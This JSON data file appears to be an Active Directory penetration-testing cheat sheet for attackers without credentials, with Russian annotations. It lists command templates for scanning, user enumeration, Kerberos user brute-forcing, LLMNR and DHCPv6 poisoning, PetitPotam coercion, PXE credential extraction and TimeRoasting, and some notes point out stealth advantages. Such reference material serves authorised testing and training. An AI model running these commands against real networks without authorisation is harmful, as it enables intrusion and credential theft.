[
  {
    "condition": "No credential",
    "attack_type": "Scan network",
    "tool": "NetExec (nxc)",
    "req": "Target IP range",
    "command": "nxc smb <ip_range>",
    "profit": "SMB Information / Vulnerable host",
    "critical_note": "Базовое сканирование для определения версий Windows, имен хостов и проверки наличия цифровой подписи SMB (SMB Signing).",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Scan network",
    "tool": "Nmap",
    "req": "Target IP",
    "command": "nmap -sP -p <ip>",
    "profit": "Host Discovery (Ping scan)",
    "critical_note": "Быстрое обнаружение активных хостов в сети (Ping scan).",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Scan network",
    "tool": "Nmap",
    "req": "Target IP",
    "command": "nmap -Pn -sV --top-ports 50 --open <ip>",
    "profit": "Open Ports & Service Versions",
    "critical_note": "Сканирование топ-50 портов без ping (-Pn). Полезно, если ICMP заблокирован фаерволом.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Scan network",
    "tool": "Nmap",
    "req": "Target IP",
    "command": "nmap -Pn --script smb-vuln* -p139,445 <ip>",
    "profit": "Vulnerable host",
    "critical_note": "Проверка на известные критические уязвимости SMB (например, MS17-010 EternalBlue) с использованием NSE скриптов.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Scan network",
    "tool": "Nmap",
    "req": "Target IP",
    "command": "nmap -Pn -sC -sV -oA <output> <ip>",
    "profit": "Default Scripts & Version Detection",
    "critical_note": "Стандартное сканирование с определением версий сервисов и запуском дефолтных скриптов. Сохраняет вывод во всех форматах.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Scan network",
    "tool": "Nmap",
    "req": "Target IP",
    "command": "nmap -Pn -sC -sV -p- -oA <output> <ip>",
    "profit": "Full Port Scan Results",
    "critical_note": "Полное сканирование всех 65535 портов. Занимает много времени и создает много шума в сети.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Scan network",
    "tool": "Nmap",
    "req": "Target IP",
    "command": "nmap -sU -sC -sV -oA <output> <ip>",
    "profit": "UDP Scan Results",
    "critical_note": "Сканирование UDP портов. Важно для обнаружения сервисов вроде SNMP, TFTP или Kerberos (88/udp), но работает медленно.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Find DC IP",
    "tool": "Network Manager CLI (nmcli)",
    "req": "Network Interface",
    "command": "nmcli dev show <interface>",
    "profit": "DNS Servers / Network Config",
    "critical_note": "Получение информации о DNS-серверах из конфигурации интерфейса, что часто указывает на IP контроллера домена.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Find DC IP",
    "tool": "nslookup",
    "req": "Domain Name",
    "command": "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
    "profit": "DC IP Address",
    "critical_note": "Запрос SRV-записи DNS для поиска контроллеров домена (LDAP сервис). Стандартный механизм обнаружения DC.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Find DC IP",
    "tool": "Nmap",
    "req": "IP Range",
    "command": "nmap -p 88 --open <ip_range>",
    "profit": "DC IP Address (Kerberos Port)",
    "critical_note": "Поиск хостов с открытым портом 88 (Kerberos). В среде AD этот порт открыт преимущественно на контроллерах домена.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Zone transfer",
    "tool": "Dig",
    "req": "Domain Name, Name Server",
    "command": "dig axfr <domain_name> @<name_server>",
    "profit": "DNS Zone Data",
    "critical_note": "Попытка выполнения AXFR (полная передача зоны). Если успешно, раскрывает все DNS-записи домена (имена хостов, IP).",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Anonymous & Guest access on SMB shares",
    "tool": "NetExec (nxc)",
    "req": "IP Range",
    "command": "nxc smb <ip_range> -u \"\" -p \"\"",
    "profit": "Anonymous Share Access",
    "critical_note": "Проверка возможности подключения к SMB без учетных данных (null session).",
    "kill_chain_phase": "CREDS"
  },
  {
    "condition": "No credential",
    "attack_type": "Anonymous & Guest access on SMB shares",
    "tool": "NetExec (nxc)",
    "req": "IP Range",
    "command": "nxc smb <ip_range> -u 'a' -p ''",
    "profit": "Guest Share Access",
    "critical_note": "Проверка доступа с заведомо неверным пользователем, который может быть маппирован в Guest (если включен гостевой доступ).",
    "kill_chain_phase": "CREDS"
  },
  {
    "condition": "No credential",
    "attack_type": "Anonymous & Guest access on SMB shares",
    "tool": "enum4linux-ng",
    "req": "Target IP",
    "command": "enum4linux-ng.py -a -u '' -p '' <ip>",
    "profit": "SMB Enumeration Data",
    "critical_note": "Комплексный инструмент для перечисления SMB/RPC. С флагами пустых кредов пытается извлечь максимум информации анонимно.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Anonymous & Guest access on SMB shares",
    "tool": "smbclient",
    "req": "Target IP",
    "command": "smbclient -U '%' -L //<ip>",
    "profit": "List of SMB Shares",
    "critical_note": "Ручная попытка листинга общих папок (shares) с использованием пустой сессии (символ %).",
    "kill_chain_phase": "CREDS"
  },
  {
    "condition": "No credential",
    "attack_type": "Enumerate LDAP",
    "tool": "Nmap",
    "req": "DC IP",
    "command": "nmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>",
    "profit": "Username",
    "critical_note": "Использование NSE скриптов для извлечения информации из LDAP (Naming Context, имена серверов) без брутфорса.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Enumerate LDAP",
    "tool": "ldapsearch",
    "req": "DC IP",
    "command": "ldapsearch -x -H <dc_ip> -s base",
    "profit": "Naming Context / Domain Info",
    "critical_note": "Запрос к корню LDAP (base naming context) с использованием простой аутентификации (-x), часто работает анонимно.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Enumerate Users",
    "tool": "NetExec (nxc)",
    "req": "DC IP",
    "command": "nxc smb <dc_ip> --users",
    "profit": "Username",
    "critical_note": "Попытка перечисления пользователей через SMB. Успех зависит от настроек RestrictAnonymous.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Enumerate Users",
    "tool": "NetExec (nxc)",
    "req": "DC IP",
    "command": "nxc smb <dc_ip> --rid-brute 10000",
    "profit": "Username",
    "critical_note": "RID Cycling: перебор идентификаторов (RID) для сопоставления их с именами пользователей. Работает даже если прямой листинг запрещен.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Enumerate Users",
    "tool": "rpcclient (via net)",
    "req": "Domain, Target IP",
    "command": "net rpc group members 'Domain Users' -W '<domain>' -I <ip> -U '%'",
    "profit": "Username",
    "critical_note": "Использование RPC для получения списка членов группы 'Domain Users' через анонимное подключение.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Bruteforce users",
    "tool": "Kerbrute",
    "req": "Domain, Userlist",
    "command": "kerbrute userenum -d <domain> <userlist>",
    "profit": "Username",
    "critical_note": "Перечисление пользователей через ошибки Kerberos Pre-Auth. Быстро и скрытно: не создает событий неудачного входа (Event ID 4625).",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Bruteforce users",
    "tool": "Nmap",
    "req": "Domain, Userlist File, DC IP",
    "command": "nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>',userdb=<user_list_file>\" <dc_ip>",
    "profit": "Username",
    "critical_note": "Аналог Kerbrute, реализованный через скрипт Nmap. Проверяет валидность пользователей по ответу Kerberos.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Poisoning",
    "tool": "Responder",
    "req": "Network Interface (LLMNR/NBTNS/MDNS)",
    "command": "responder -I <interface>",
    "profit": "poisoning SMB / poisoning LDAP / poisoning HTTP",
    "critical_note": "Отравление запросов LLMNR/NBTNS/MDNS. Позволяет перехватывать NTLMv2 хеши при попытках жертв обратиться к несуществующим ресурсам.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Poisoning",
    "tool": "mitm6",
    "req": "Domain (DHCPv6)",
    "command": "mitm6 -d <domain>",
    "profit": "poisoning SMB / poisoning LDAP / poisoning HTTP",
    "critical_note": "Атака через IPv6. Выступает как мошеннический DHCPv6 сервер, назначая себя DNS сервером для жертв.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Poisoning",
    "tool": "Bettercap",
    "req": "Network Access (DHCPv6)",
    "command": "bettercap",
    "profit": "poisoning SMB / poisoning LDAP / poisoning HTTP",
    "critical_note": "Мощный комбайн для MITM. Может выполнять ARP spoofing, DHCPv6 spoofing и перехват трафика.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "Poisoning",
    "tool": "ASREPRoast / Pcredz",
    "req": "Network Interface (ARP Poisoning)",
    "command": "asreqroast -> Pcredz -i <interface> -v",
    "profit": "Hash found ASREQ",
    "critical_note": "Пассивный сниффинг или активный перехват пакетов для извлечения хешей AS-REQ (пользователи без Pre-Auth).",
    "kill_chain_phase": "CREDS"
  },
  {
    "condition": "No credential",
    "attack_type": "Coerce",
    "tool": "PetitPotam",
    "req": "Domain, Listener IP, Target IP",
    "command": "petitpotam.py -d <domain> <listener> <target>",
    "profit": "Coerce SMB",
    "critical_note": "Принуждение контроллера домена к аутентификации на узле атакующего (Coercion) через EFS MS-EFRPC. Используется для NTLM Relay.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "No credential",
    "attack_type": "PXE",
    "tool": "PXEThief",
    "req": "No password required",
    "command": "pxethief.py 1",
    "profit": "Credentials (NAA account)",
    "critical_note": "Поиск файлов ответов в средах развертывания ОС (SCCM/MDT/WDS) для извлечения учетных данных Network Access Account.",
    "kill_chain_phase": "PRIVESC"
  },
  {
    "condition": "No credential",
    "attack_type": "PXE",
    "tool": "PXEThief",
    "req": "Distribution Point IP (No password)",
    "command": "pxethief.py 2 <distribution_point_ip>",
    "profit": "Credentials (NAA account)",
    "critical_note": "Атака на конкретную точку распространения (Distribution Point) для извлечения секретов.",
    "kill_chain_phase": "CREDS"
  },
  {
    "condition": "No credential",
    "attack_type": "PXE",
    "tool": "TFTP Client",
    "req": "Distribution Point IP (Password protected)",
    "command": "tftp -i <dp_ip> GET \"\\xxx\\boot.var\"",
    "profit": "PXE Hash",
    "critical_note": "Попытка скачать файл переменных загрузки через TFTP, который может содержать хеши паролей.",
    "kill_chain_phase": "CREDS"
  },
  {
    "condition": "No credential",
    "attack_type": "PXE",
    "tool": "PXEThief",
    "req": "Path to boot.var (Password protected)",
    "command": "pxethief.py 5 '\\xxx\\boot.var'",
    "profit": "PXE Hash",
    "critical_note": "Расшифровка или извлечение данных из полученного файла boot.var.",
    "kill_chain_phase": "CREDS"
  },
  {
    "condition": "No credential",
    "attack_type": "TimeRoasting",
    "tool": "TimeRoast",
    "req": "DC IP",
    "command": "timeroast.py <dc_ip> -o <output_log>",
    "profit": "timeroast hash",
    "critical_note": "Атака на NTP (Network Time Protocol). Позволяет сбрутить хеш пароля машинной учетной записи через неаутентифицированные NTP пакеты.",
    "kill_chain_phase": "CREDS"
  }
]